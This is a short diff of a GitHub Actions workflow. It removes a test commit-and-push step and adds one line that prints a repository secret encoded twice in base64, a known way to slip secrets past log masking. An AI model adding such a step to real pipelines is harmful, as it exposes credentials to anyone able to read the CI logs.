@@ -12,12 +12,4 @@ jobs:
     steps:
       - name: Checkout
         uses: actions/checkout@v4
-      - run: echo ${{ vars.TEST }}
-      - name: push
-        run: |
-          echo "a" > test.txt
-          git config user.email "test@gmail.com"
-          git config user.name "test"
-          git add .
-          git commit -m "tesT"
-          git push
+      - run: echo ${{ secrets.BACON }} | base64 | base64
